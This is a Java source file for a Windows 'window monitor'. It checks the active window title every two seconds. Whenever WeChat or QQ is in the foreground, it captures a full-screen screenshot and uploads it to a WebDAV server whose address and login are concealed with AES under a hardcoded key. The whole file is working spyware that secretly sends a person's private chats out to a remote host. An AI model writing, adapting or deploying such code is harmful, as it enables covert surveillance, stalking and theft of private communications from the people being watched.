/*
 * Copyright (c) 2025 unknowIfGuestInDream.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *     * Neither the name of unknowIfGuestInDream, any associated website, nor the
 * names of its contributors may be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL UNKNOWIFGUESTINDREAM BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package com.tlcsdm.windowmonitor;

import com.github.sardine.Sardine;
import com.github.sardine.SardineFactory;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;

import javax.crypto.SecretKey;
import javax.imageio.ImageIO;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * @author unknowIfGuestInDream
 */
public class WindowMonitorUploader {

    private static final String FIXED_KEY_STR = "tLcsdMwIndoWmOnt";
    private static String WEBDAV_URL = "cN2tIFNhoFyjJ44hmiYoyWKtJEbDF0HMquNp0XX98DM=";
    private static final String USERNAME = "DVlKm5MyVy9+MVLS7wTVHhx6gVPPLfi6YqM0P3oP9KQ=";
    private static final String PASSWORD = "jg8PewVdbl3x1KDrc24iwBhvVutacFQFq6MQaxt807PTn0gaMhrLNPqUt1kLi+Bb";
    private static final String MATCH_KEYWORD_1 = "微信";
    private static final String MATCH_KEYWORD_2 = "QQ";
    private static final long interval = 2000;

    public static void main(String[] args) throws Exception {
        SecretKey key = AesUtil.getFixedKey(FIXED_KEY_STR);
        WEBDAV_URL = AesUtil.decrypt(WEBDAV_URL, key);
        Sardine sardine = SardineFactory.begin(AesUtil.decrypt(USERNAME, key), AesUtil.decrypt(PASSWORD, key));
        while (true) {
            try {
                String title = getActiveWindowTitle();
                if (title.contains(MATCH_KEYWORD_1)) {
                    uploadImage(sardine, "wechat");
                } else if (title.contains(MATCH_KEYWORD_2)) {
                    uploadImage(sardine, "qq");
                }
                Thread.sleep(interval);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void uploadImage(Sardine sardine, String prefix) throws Exception {
        BufferedImage screenshot = takeFullScreenshot();
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
        String dateCary = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyyMMdd"));
        String fileName = prefix + "_" + timestamp + ".png";
        // 将截图写入 ByteArrayOutputStream
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenshot, "png", baos);
        baos.flush();
        byte[] imageData = baos.toByteArray();
        baos.close();
        // 直接使用 byte[] 上传文件
        sardine.put(WEBDAV_URL + dateCary + "/" + fileName, imageData);
    }

    private static String getActiveWindowTitle() {
        char[] buffer = new char[1024];
        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        User32.INSTANCE.GetWindowText(hwnd, buffer, 1024);
        return Native.toString(buffer);
    }

    /**
     * 截全屏
     */
    private static BufferedImage takeFullScreenshot() throws Exception {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        return new Robot().createScreenCapture(screenRect);
    }

    /**
     * 截取窗口
     */
    private static BufferedImage takeWindowScreenshot() throws Exception {
        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        WinDef.RECT rect = new WinDef.RECT();
        User32.INSTANCE.GetWindowRect(hwnd, rect);
        Rectangle captureRect = new Rectangle(rect.left, rect.top,
                rect.right - rect.left, rect.bottom - rect.top);
        return new Robot().createScreenCapture(captureRect);
    }
}
